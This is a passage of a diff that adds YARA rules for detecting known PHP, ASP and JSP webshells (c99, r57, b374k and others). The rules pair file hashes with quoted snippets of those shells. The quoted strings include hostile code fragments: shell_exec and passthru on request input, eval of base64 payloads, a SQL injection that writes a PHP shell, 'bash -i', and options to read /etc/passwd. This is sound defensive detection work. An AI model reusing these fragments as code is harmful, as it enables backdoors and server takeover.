+		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
+		hash2 = "44542e5c3e9790815c49d5f9beffbbf2"
+		hash3 = "d089e7168373a0634e1ac18c0ee00085"
+		hash4 = "38fd7e45f9c11a37463c3ded1c76af4c"
+	strings:
+		$s0 = "$result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock); " fullword
+	condition:
+		all of them
+}
+
+rule multiple_webshells_0030 {
+	meta:
+		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_1_SpecialShell_99_php_php"
+		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
+		hash1 = "3ca5886cd54d495dc95793579611f59a"
+		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
+		hash3 = "44542e5c3e9790815c49d5f9beffbbf2"
+		hash4 = "09609851caa129e40b0d56e90dfc476c"
+	strings:
+		$s0 = "if ($total === FALSE) {$total = 0;}" fullword
+		$s1 = "$free_percent = round(100/($total/$free),2);" fullword
+		$s2 = "if (!$bool) {$bool = is_dir($letter.\":\\\\\");}" fullword
+		$s3 = "$bool = $isdiskette = in_array($letter,$safemode_diskettes);" fullword
+	condition:
+		2 of them
+}
+
+rule multiple_webshells_0031 {
+	meta:
+		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_r577_php_php_r57_php_php_spy_php_php_s_php_php"
+		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
+		hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
+		hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
+		hash3 = "817671e1bdc85e04cc3440bbd9288800"
+	strings:
+		$s0 = "$res = mssql_query(\"select * from r57_temp_table\",$db);" fullword
+		$s2 = "'eng_text30'=>'Cat file'," fullword
+		$s3 = "@mssql_query(\"drop table r57_temp_table\",$db);" fullword
+	condition:
+		1 of them
+}
+
+rule DarkSecurityTeam_Webshell {
+	meta:
+		description = "Dark Security Team Webshell"
+		author = "Florian Roth"
+		hash = "f1c95b13a71ca3629a0bb79601fcacf57cdfcf768806a71b26f2448f8c1d5d24"
+		score = 50
+	strings:
+		$s0 = "form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\"&HtmlEncode(Server.MapPath(\".\"))&" ascii
+	condition:
+		1 of them
+}
+
+rule WebShell_RemExp_asp_php {
+	meta:
+		description = "PHP Webshells Github Archive - file RemExp.asp.php.txt"
+		author = "Florian Roth"
+		hash = "d9919dcf94a70d5180650de8b81669fa1c10c5a2"
+	strings:
+		$s0 = "lsExt = Right(FileName, Len(FileName) - liCount)" fullword
+		$s7 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
+		$s13 = "Response.Write Drive.ShareName & \" [share]\"" fullword
+		$s19 = "If Request.QueryString(\"CopyFile\") <> \"\" Then" fullword
+		$s20 = "<td width=\"40%\" height=\"20\" bgcolor=\"silver\">  Name</td>" fullword
+	condition:
+		all of them
+}
+
+rule WebShell_simattacker {
+	meta:
+		description = "PHP Webshells Github Archive - file simattacker.php"
+		author = "Florian Roth"
+		hash = "258297b62aeaf4650ce04642ad5f19be25ec29c9"
+	strings:
+		$s1 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword
+		$s4 = "&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>" fullword
+		$s5 = "&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>" fullword
+		$s6 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
+		$s10 = "&nbsp;e-mail : kingdefacer@msn.com<br>" fullword
+		$s17 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
+		$s18 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
+		$s20 = "$Comments=$_POST['Comments'];" fullword
+	condition:
+		2 of them
+}
+
+rule WebShell_ironshell {
+	meta:
+		description = "PHP Webshells Github Archive - file ironshell.php"
+		author = "Florian Roth"
+		hash = "d47b8ba98ea8061404defc6b3a30839c4444a262"
+	strings:
+		$s0 = "<title>'.getenv(\"HTTP_HOST\").' ~ Shell I</title>" fullword
+		$s2 = "$link = mysql_connect($_POST['host'], $_POST['username'], $_POST"
+		$s4 = "error_reporting(0); //If there is an error, we'll show it, k?" fullword
+		$s8 = "print \"<form action=\\\"\".$me.\"?p=chmod&file=\".$content.\"&d"
+		$s15 = "if(!is_numeric($_POST['timelimit']))" fullword
+		$s16 = "if($_POST['chars'] == \"9999\")" fullword
+		$s17 = "<option value=\\\"az\\\">a - zzzzz</option>" fullword
+		$s18 = "print shell_exec($command);" fullword
+	condition:
+		3 of them
+}
+
+rule WebShell_indexer_asp_php {
+	meta:
+		description = "PHP Webshells Github Archive - file indexer.asp.php.txt"
+		author = "Florian Roth"
+		hash = "e9a7aa5eb1fb228117dc85298c7d3ecd8e288a2d"
+	strings:
+		$s0 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword
+		$s1 = "<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>" fullword
+		$s2 = "<form action=\"?Gonder\" method=\"post\">" fullword
+		$s4 = "<form action=\"?oku\" method=\"post\">" fullword
+		$s7 = "var message=\"SaNaLTeRoR - " fullword
+		$s8 = "nDexEr - Reader\"" fullword
+	condition:
+		3 of them
+}
+
+rule WebShell_toolaspshell {
+	meta:
+		description = "PHP Webshells Github Archive - file toolaspshell.php"
+		author = "Florian Roth"
+		hash = "11d236b0d1c2da30828ffd2f393dd4c6a1022e3f"
+	strings:
+		$s0 = "cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef"
+		$s12 = "barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\"\\\")) - 1" fullword
+		$s20 = "destino3 = folderItem.path & \"\\index.asp\"" fullword
+	condition:
+		2 of them
+}
+
+rule WebShell_b374k_mini_shell_php_php {
+	meta:
+		description = "PHP Webshells Github Archive - file b374k-mini-shell-php.php.php"
+		author = "Florian Roth"
+		hash = "afb88635fbdd9ebe86b650cc220d3012a8c35143"
+	strings:
+		$s0 = "@error_reporting(0);" fullword
+		$s2 = "@eval(gzinflate(base64_decode($code)));" fullword
+		$s3 = "@set_time_limit(0); " fullword
+	condition:
+		all of them
+}
+
+rule WebShell_b374k_php {
+	meta:
+		description = "PHP Webshells Github Archive - file b374k.php.php"
+		author = "Florian Roth"
+		hash = "04c99efd187cf29dc4e5603c51be44170987bce2"
+	strings:
+		$s0 = "// encrypt your password to md5 here http://kerinci.net/?x=decode" fullword
+		$s6 = "// password (default is: b374k)"
+		$s8 = "//******************************************************************************"
+		$s9 = "// b374k 2.2" fullword
+		$s10 = "eval(\"?>\".gzinflate(base64_decode("
+	condition:
+		3 of them
+}
+
+rule WebShell_SimAttacker___Vrsion_1_0_0___priv8_4_My_friend {
+	meta:
+		description = "PHP Webshells Github Archive - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
+		author = "Florian Roth"
+		hash = "6454cc5ab73143d72cf0025a81bd1fe710351b44"
+	strings:
+		$s4 = "&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM <br>" fullword
+		$s5 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
+		$s10 = "<a style=\"TEXT-DECORATION: none\" href=\"http://www.simorgh-ev.com\">" fullword
+		$s16 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
+		$s17 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
+		$s19 = "$Comments=$_POST['Comments'];" fullword
+		$s20 = "Victim Mail :<br><input type='text' name='to' ><br>" fullword
+	condition:
+		3 of them
+}
+
+rule WebShell_h4ntu_shell__powered_by_tsoi_ {
+	meta:
+		description = "PHP Webshells Github Archive - file h4ntu shell [powered by tsoi].php"
+		author = "Florian Roth"
+		hash = "cbca8cd000e705357e2a7e0cf8262678706f18f9"
+	strings:
+		$s11 = "<title>h4ntu shell [powered by tsoi]</title>" fullword
+		$s13 = "$cmd = $_POST['cmd'];" fullword
+		$s16 = "$uname = posix_uname( );" fullword
+		$s17 = "if(!$whoami)$whoami=exec(\"whoami\");" fullword
+		$s18 = "echo \"<p><font size=2 face=Verdana><b>This Is The Server Information</b></font>"
+		$s20 = "ob_end_clean();" fullword
+	condition:
+		3 of them
+}
+
+rule WebShell_php_webshells_MyShell {
+	meta:
+		description = "PHP Webshells Github Archive - file MyShell.php"
+		author = "Florian Roth"
+		hash = "42e283c594c4d061f80a18f5ade0717d3fb2f76d"
+	strings:
+		$s3 = "<title>MyShell error - Access Denied</title>" fullword
+		$s4 = "$adminEmail = \"youremail@yourserver.com\";" fullword
+		$s5 = "//A workdir has been asked for - we chdir to that dir." fullword
+		$s6 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
+		$s13 = "#$autoErrorTrap Enable automatic error traping if command returns error." fullword
+		$s14 = "/* No work_dir - we chdir to $DOCUMENT_ROOT */" fullword
+		$s19 = "#every command you excecute." fullword
+		$s20 = "<form name=\"shell\" method=\"post\">" fullword
+	condition:
+		3 of them
+}
+
+rule WebShell_reader_asp_php {
+	meta:
+		description = "PHP Webshells Github Archive - file reader.asp.php.txt"
+		author = "Florian Roth"
+		hash = "70656f3495e2b3ad391a77d5208eec0fb9e2d931"
+	strings:
+		$s5 = "ster\" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail"
+		$s12 = " HACKING " fullword
+		$s16 = "FONT-WEIGHT: bold; BACKGROUND: #ffffff url('images/cellpic1.gif'); TEXT-INDENT: "
+		$s20 = "PADDING-RIGHT: 8px; PADDING-LEFT: 8px; FONT-WEIGHT: bold; FONT-SIZE: 11px; BACKG"
+	condition:
+		3 of them
+}
+
+rule WebShell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit {
+	meta:
+		description = "PHP Webshells Github Archive - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
+		author = "Florian Roth"
+		hash = "b2b797707e09c12ff5e632af84b394ad41a46fa4"
+	strings:
+		$s4 = "$liz0zim=shell_exec($_POST[liz0]); " fullword
+		$s6 = "$liz0=shell_exec($_POST[baba]); " fullword
+		$s9 = "echo \"<b><font color=blue>Liz0ziM Private Safe Mode Command Execuriton Bypass E"
+		$s12 = " :=) :</font><select size=\"1\" name=\"liz0\">" fullword
+		$s13 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword
+	condition:
+		1 of them
+}
+
+rule WebShell_php_backdoor {
+	meta:
+		description = "PHP Webshells Github Archive - file php-backdoor.php"
+		author = "Florian Roth"
+		hash = "b190c03af4f3fb52adc20eb0f5d4d151020c74fe"
+	strings:
+		$s5 = "http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix" fullword
+		$s6 = "// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombi"
+		$s11 = "if(!isset($_REQUEST['dir'])) die('hey,specify directory!');" fullword
+		$s13 = "else echo \"<a href='$PHP_SELF?f=$d/$dir'><font color=black>\";" fullword
+		$s15 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "
+	condition:
+		1 of them
+}
+
+rule WebShell_php_webshells_pHpINJ {
+	meta:
+		description = "PHP Webshells Github Archive - file pHpINJ.php"
+		author = "Florian Roth"
+		hash = "75116bee1ab122861b155cc1ce45a112c28b9596"
+	strings:
+		$s3 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" fullword
+		$s10 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">" fullword
+		$s11 = "$sql = \"0' UNION SELECT '0' , '<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN"
+		$s13 = "Full server path to a writable file which will contain the Php Shell <br />" fullword
+		$s14 = "$expurl= $url.\"?id=\".$sql ;" fullword
+		$s15 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />" fullword
+		$s16 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />" fullword
+	condition:
+		1 of them
+}
+
+rule WebShell_php_webshells_NGH {
+	meta:
+		description = "PHP Webshells Github Archive - file NGH.php"
+		author = "Florian Roth"
+		hash = "c05b5deecfc6de972aa4652cb66da89cfb3e1645"
+	strings:
+		$s0 = "<title>Webcommander at <?=$_SERVER[\"HTTP_HOST\"]?></title>" fullword
+		$s2 = "/* Webcommander by Cr4sh_aka_RKL v0.3.9 NGH edition :p */" fullword
+		$s5 = "<form action=<?=$script?>?act=bindshell method=POST>" fullword
+		$s9 = "<form action=<?=$script?>?act=backconnect method=POST>" fullword
+		$s11 = "<form action=<?=$script?>?act=mkdir method=POST>" fullword
+		$s16 = "die(\"<font color=#DF0000>Login error</font>\");" fullword
+		$s20 = "<b>Bind /bin/bash at port: </b><input type=text name=port size=8>" fullword
+	condition:
+		2 of them
+}
+
+rule WebShell_php_webshells_matamu {
+	meta:
+		description = "PHP Webshells Github Archive - file matamu.php"
+		author = "Florian Roth"
+		hash = "d477aae6bd2f288b578dbf05c1c46b3aaa474733"
+	strings:
+		$s2 = "$command .= ' -F';" fullword
+		$s3 = "/* We try and match a cd command. */" fullword
+		$s4 = "directory... Trust me - it works :-) */" fullword
+		$s5 = "$command .= \" 1> $tmpfile 2>&1; \" ." fullword
+		$s10 = "$new_dir = $regs[1]; // 'cd /something/...'" fullword
+		$s16 = "/* The last / in work_dir were the first charecter." fullword
+	condition:
+		2 of them
+}
+
+rule WebShell_c99_madnet {
+	meta:
+		description = "PHP Webshells Github Archive - file c99_madnet.php"
+		author = "Florian Roth"
+		hash = "17613df393d0a99fd5bea18b2d4707f566cff219"
+	strings:
+		$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
+		$s1 = "eval(gzinflate(base64_decode('"
+		$s2 = "$pass = \"pass\";  //Pass" fullword
+		$s3 = "$login = \"user\"; //Login" fullword
+		$s4 = "             //Authentication" fullword
+	condition:
+		all of them
+}
+
+rule WebShell_JspWebshell_1_2 {
+	meta:
+		description = "PHP Webshells Github Archive - file JspWebshell_1.2.php"
+		author = "Florian Roth"
+		hash = "0bed4a1966117dd872ac9e8dceceb54024a030fa"
+	strings:
+		$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
+		$s1 = "String password=request.getParameter(\"password\");" fullword
+		$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
+		$s7 = "String editfile=request.getParameter(\"editfile\");" fullword
+		$s8 = "//String tempfilename=request.getParameter(\"file\");" fullword
+		$s12 = "password = (String)session.getAttribute(\"password\");" fullword
+	condition:
+		3 of them
+}
+
+rule WebShell_Uploader {
+	meta:
+		description = "PHP Webshells Github Archive - file Uploader.php"
+		author = "Florian Roth"
+		hash = "e216c5863a23fde8a449c31660fd413d77cce0b7"
+	strings:
+		$s1 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
+	condition:
+		all of them
+}
+
+rule WebShell_php_webshells_kral {
+	meta:
+		description = "PHP Webshells Github Archive - file kral.php"
+		author = "Florian Roth"
+		hash = "4cd1d1a2fd448cecc605970e3a89f3c2e5c80dfc"
+	strings:
+		$s1 = "$adres=gethostbyname($ip);" fullword
+		$s3 = "curl_setopt($ch,CURLOPT_POSTFIELDS,\"domain=\".$site);" fullword
+		$s4 = "$ekle=\"/index.php?option=com_user&view=reset&layout=confirm\";" fullword
+		$s16 = "echo $son.' <br> <font color=\"green\">Access</font><br>';" fullword
+		$s17 = "<p>kodlama by <a href=\"mailto:priv8coder@gmail.com\">BLaSTER</a><br /"
+		$s20 = "<p><strong>Server listeleyici</strong><br />" fullword
+	condition:
+		2 of them
+}
+
+rule WebShell_cgitelnet {
+	meta:
+		description = "PHP Webshells Github Archive - file cgitelnet.php"
+		author = "Florian Roth"
+		hash = "72e5f0e4cd438e47b6454de297267770a36cbeb3"
+	strings:
+		$s9 = "# Author Homepage: http://www.rohitab.com/" fullword
+		$s10 = "elsif($Action eq \"command\") # user wants to run a command" fullword
+		$s18 = "# in a command line on Windows NT." fullword
+		$s20 = "print \"Transfered $TargetFileSize Bytes.<br>\";" fullword
+	condition:
+		2 of them
+}
+
+rule WebShell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_2 {
+	meta:
+		description = "PHP Webshells Github Archive - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
+		author = "Florian Roth"
+		hash = "8fdd4e0e87c044177e9e1c97084eb5b18e2f1c25"
+	strings:
+		$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
+		$s3 = "xb5@hotmail.com</FONT></CENTER></B>\");" fullword
+		$s4 = "$v = @ini_get(\"open_basedir\");" fullword
+		$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword
+	condition:
+		2 of them
+}
+
+rule WebShell_NTDaddy_v1_9 {
+	meta:
+		description = "PHP Webshells Github Archive - file NTDaddy v1.9.php"
+		author = "Florian Roth"
+		hash = "79519aa407fff72b7510c6a63c877f2e07d7554b"
+	strings:
+		$s2 = "|     -obzerve : mr_o@ihateclowns.com |" fullword
+		$s6 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
+		$s13 = "<form action=ntdaddy.asp method=post>" fullword
+		$s17 = "response.write(\"<ERROR: THIS IS NOT A TEXT FILE>\")" fullword
+	condition:
+		2 of them
+}
+
+rule WebShell_C99madShell_v__2_0_madnet_edition {
+	meta:
+		description = "PHP Webshells Github Archive - file C99madShell v. 2.0 madnet edition.php"
+		author = "Florian Roth"
+		hash = "f99f8228eb12746847f54bad45084f19d1a7e111"
+	strings:
+		$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
+		$s1 = "eval(gzinflate(base64_decode('"
+		$s2 = "$pass = \"\";  //Pass" fullword
+		$s3 = "$login = \"\"; //Login" fullword
+		$s4 = "//Authentication" fullword
+	condition:
+		all of them
+}
+
+rule WebShell_CmdAsp_asp_php {
+	meta:
+		description = "PHP Webshells Github Archive - file CmdAsp.asp.php.txt"
+		author = "Florian Roth"
+		hash = "cb18e1ac11e37e236e244b96c2af2d313feda696"
+	strings:
+		$s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
+		$s4 = "' Author: Maceo <maceo @ dogmile.com>" fullword
+		$s5 = "' -- Use a poor man's pipe ... a temp file -- '" fullword
+		$s6 = "' --------------------o0o--------------------" fullword
+		$s8 = "' File: CmdAsp.asp" fullword
+		$s11 = "<-- CmdAsp.asp -->" fullword
+		$s14 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
+		$s16 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword
+		$s19 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
+	condition:
+		4 of them
+}
+
+rule WebShell_php_webshells_README {
+	meta:
+		description = "PHP Webshells Github Archive - file README.md"
+		author = "Florian Roth"
+		hash = "ef2c567b4782c994db48de0168deb29c812f7204"
+	strings:
+		$s0 = "Common php webshells. Do not host the file(s) in your server!" fullword
+		$s1 = "php-webshells" fullword
+	condition:
+		all of them
+}
+
+rule WebShell_backupsql {
+	meta:
+		description = "PHP Webshells Github Archive - file backupsql.php"
+		author = "Florian Roth"
+		hash = "863e017545ec8e16a0df5f420f2d708631020dd4"
+	strings:
+		$s0 = "$headers .= \"\\nMIME-Version: 1.0\\n\" .\"Content-Type: multipart/mixed;\\n\" ."
+		$s1 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
+		$s2 = "* as email attachment, or send to a remote ftp server by" fullword
+		$s16 = "* Neagu Mihai<neagumihai@hotmail.com>" fullword
+		$s17 = "$from    = \"Neu-Cool@email.com\";  // Who should the emails be sent from?, may "
+	condition:
+		2 of them
+}
+
+rule WebShell_AK_74_Security_Team_Web_Shell_Beta_Version {
+	meta:
+		description = "PHP Webshells Github Archive - file AK-74 Security Team Web Shell Beta Version.php"
+		author = "Florian Roth"
+		hash = "c90b0ba575f432ecc08f8f292f3013b5532fe2c4"
+	strings:
+		$s8 = "- AK-74 Security Team Web Site: www.ak74-team.net" fullword
+		$s9 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'."
+		$s10 = "<b><font color=#83000>Execute system commands!</font></b>" fullword
+	condition:
+		1 of them
+}
+
+rule WebShell_accept_language {
+	meta:
+		description = "PHP Webshells Github Archive - file accept_language.php"
+		author = "Florian Roth"
+		hash = "180b13576f8a5407ab3325671b63750adbcb62c9"
+	strings:
+		$s0 = "<?php passthru(getenv(\"HTTP_ACCEPT_LANGUAGE\")); echo '<br> by q1w2e3r4'; ?>" fullword
+	condition:
+		all of them
+}
+
+rule WebShell_php_webshells_529 {
+	meta:
+		description = "PHP Webshells Github Archive - file 529.php"
+		author = "Florian Roth"
+		hash = "ba3fb2995528307487dff7d5b624d9f4c94c75d3"
+	strings:
+		$s0 = "<p>More: <a href=\"/\">Md5Cracking.Com Crew</a> " fullword
+		$s7 = "href=\"/\" title=\"Securityhouse\">Security House - Shell Center - Edited By Kin"
+		$s9 = "echo '<PRE><P>This is exploit from <a " fullword
+		$s10 = "This Exploit Was Edited By KingDefacer" fullword
+		$s13 = "safe_mode and open_basedir Bypass PHP 5.2.9 " fullword
+		$s14 = "$hardstyle = explode(\"/\", $file); " fullword
+		$s20 = "while($level--) chdir(\"..\"); " fullword
+	condition:
+		2 of them
+}
+
+rule WebShell_php_webshells_tryag {
+	meta:
+		description = "PHP Webshells Github Archive - file tryag.php"
+		author = "Florian Roth"
+		hash = "42d837e9ab764e95ed11b8bd6c29699d13fe4c41"
+	strings:
+		$s1 = "<title>TrYaG Team - TrYaG.php - Edited By KingDefacer</title>" fullword
+		$s3 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\"; " fullword
+		$s6 = "$string = !empty($_POST['string']) ? $_POST['string'] : 0; " fullword
+		$s7 = "$tabledump .= \"CREATE TABLE $table (\\n\"; " fullword
+		$s14 = "echo \"<center><div id=logostrip>Edit file: $editfile </div><form action='$REQUE"
+	condition:
+		3 of them
+}
+
+rule WebShell_qsd_php_backdoor {
+	meta:
+		description = "PHP Webshells Github Archive - file qsd-php-backdoor.php"
+		author = "Florian Roth"
+		hash = "4856bce45fc5b3f938d8125f7cdd35a8bbae380f"
+	strings:
+		$s1 = "// A robust backdoor script made by Daniel Berliner - http://www.qsdconsulting.c"
+		$s2 = "if(isset($_POST[\"newcontent\"]))" fullword
+		$s3 = "foreach($parts as $val)//Assemble the path back together" fullword
+		$s7 = "$_POST[\"newcontent\"]=urldecode(base64_decode($_POST[\"newcontent\"]));" fullword
+	condition:
+		2 of them
+}
+
+rule WebShell_php_webshells_spygrup {
+	meta:
+		description = "PHP Webshells Github Archive - file spygrup.php"
+		author = "Florian Roth"
+		hash = "12f9105332f5dc5d6360a26706cd79afa07fe004"
+	strings:
+		$s2 = "kingdefacer@msn.com</FONT></CENTER></B>\");" fullword
+		$s6 = "if($_POST['root']) $root = $_POST['root'];" fullword
+		$s12 = "\".htmlspecialchars($file).\" Bu Dosya zaten Goruntuleniyor<kingdefacer@msn.com>" fullword
+		$s18 = "By KingDefacer From Spygrup.org>" fullword
+	condition:
+		3 of them
+}
+
+rule WebShell_Ayyildiz_Tim___AYT__Shell_v_2_1_Biz {
+	meta:
+		description = "PHP Webshells Github Archive - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.php"
+		author = "Florian Roth"
+		hash = "5fe8c1d01dc5bc70372a8a04410faf8fcde3cb68"
+	strings:
+		$s7 = "<meta name=\"Copyright\" content=TouCh By iJOo\">" fullword
+		$s11 = "directory... Trust me - it works :-) */" fullword
+		$s15 = "/* ls looks much better with ' -F', IMHO. */" fullword
+		$s16 = "} else if ($command == 'ls') {" fullword
+	condition:
+		3 of them
+}
+
+rule WebShell_Gamma_Web_Shell {
+	meta:
+		description = "PHP Webshells Github Archive - file Gamma Web Shell.php"
+		author = "Florian Roth"
+		hash = "7ef773df7a2f221468cc8f7683e1ace6b1e8139a"
+	strings:
+		$s4 = "$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];" fullword
+		$s8 = "### Gamma Group <http://www.gammacenter.com>" fullword
+		$s15 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword
+		$s20 = "my $command = $self->query('command');" fullword
+	condition:
+		2 of them
+}
+
+rule WebShell_php_webshells_aspydrv {
+	meta:
+		description = "PHP Webshells Github Archive - file aspydrv.php"
+		author = "Florian Roth"
+		hash = "3d8996b625025dc549d73cdb3e5fa678ab35d32a"
+	strings:
+		$s0 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files"
+		$s1 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword
+		$s3 = "Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1" fullword
+		$s17 = "If request.querystring(\"getDRVs\")=\"@\" then" fullword
+		$s20 = "' ---Copy Too Folder routine Start" fullword
+	condition:
+		3 of them
+}
+
+rule WebShell_g00nshell_v1_3 {
+	meta:
+		description = "PHP Webshells Github Archive - file g00nshell-v1.3.php"
+		author = "Florian Roth"
+		hash = "70fe072e120249c9e2f0a8e9019f984aea84a504"
+	strings:
+		$s10 = "#To execute commands, simply include ?cmd=___ in the url. #" fullword
+		$s15 = "$query = \"SHOW COLUMNS FROM \" . $_GET['table'];" fullword
+		$s16 = "$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent" fullword
+		$s17 = "echo(\"<form method='GET' name='shell'>\");" fullword
+		$s18 = "echo(\"<form method='post' action='?act=sql'>\");" fullword
+	condition:
+		2 of them
+}
+
+rule WebShell_php_webshells_cw {
+	meta:
+		description = "PHP Webshells Github Archive - file cw.php"
+		author = "Florian Roth"
+		hash = "e65e0670ef6edf0a3581be6fe5ddeeffd22014bf"
+	strings:
+		$s1 = "// Dump Database [pacucci.com]" fullword
+		$s2 = "$dump = \"-- Database: \".$_POST['db'] .\" \\n\";" fullword
+		$s7 = "$aids = passthru(\"perl cbs.pl \".$_POST['connhost'].\" \".$_POST['connport']);" fullword
+		$s8 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='htt"
+		$s14 = "$dump .= \"-- Cyber-Warrior.Org\\n\";" fullword
+		$s20 = "if(isset($_POST['doedit']) && $_POST['editfile'] != $dir)" fullword
+	condition:
+		3 of them
+}
+
+rule WebShell_php_include_w_shell {
+	meta:
+		description = "PHP Webshells Github Archive - file php-include-w-shell.php"
+		author = "Florian Roth"
+		hash = "1a7f4868691410830ad954360950e37c582b0292"
+	strings:
+		$s13 = "# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!" fullword
+		$s17 = "\"phpshellapp\" => \"export TERM=xterm; bash -i\"," fullword
+		$s19 = "else if($numhosts == 1) $strOutput .= \"On 1 host..\\n\";" fullword
+	condition:
+		1 of them
+}
+
+rule WebShell_mysql_tool {
+	meta:
+		description = "PHP Webshells Github Archive - file mysql_tool.php"
+		author = "Florian Roth"
+		hash = "c9cf8cafcd4e65d1b57fdee5eef98f0f2de74474"
+	strings:
+		$s12 = "$dump .= \"-- Dumping data for table '$table'\\n\";" fullword
+		$s20 = "$dump .= \"CREATE TABLE $table (\\n\";" fullword
+	condition:
+		2 of them
+}
+
+rule WebShell_PhpSpy_Ver_2006 {
+	meta:
+		description = "PHP Webshells Github Archive - file PhpSpy Ver 2006.php"
+		author = "Florian Roth"
+		hash = "34a89e0ab896c3518d9a474b71ee636ca595625d"
+	strings:
+		$s2 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword
+		$s12 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
+		$s19 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32"
+		$s20 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe'"
+	condition:
+		1 of them
+}
+
+rule WebShell_ZyklonShell {
+	meta:
+		description = "PHP Webshells Github Archive - file ZyklonShell.php"
+		author = "Florian Roth"
+		hash = "3fa7e6f3566427196ac47551392e2386a038d61c"
+	strings:
+		$s0 = "The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>" fullword
+		$s1 = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" fullword
+		$s2 = "<TITLE>404 Not Found</TITLE>" fullword
+		$s3 = "<H1>Not Found</H1>" fullword
+	condition:
+		all of them
+}
+
+rule WebShell_php_webshells_lolipop {
+	meta:
+		description = "PHP Webshells Github Archive - file lolipop.php"
+		author = "Florian Roth"
+		hash = "86f23baabb90c93465e6851e40104ded5a5164cb"
+	strings:
+		$s3 = "$commander = $_POST['commander']; " fullword
+		$s9 = "$sourcego = $_POST['sourcego']; " fullword
+		$s20 = "$result = mysql_query($loli12) or die (mysql_error()); " fullword
+	condition:
+		all of them
+}
+
+rule WebShell_simple_cmd {
+	meta:
+		description = "PHP Webshells Github Archive - file simple_cmd.php"
+		author = "Florian Roth"
+		hash = "466a8caf03cdebe07aa16ad490e54744f82e32c2"
+	strings:
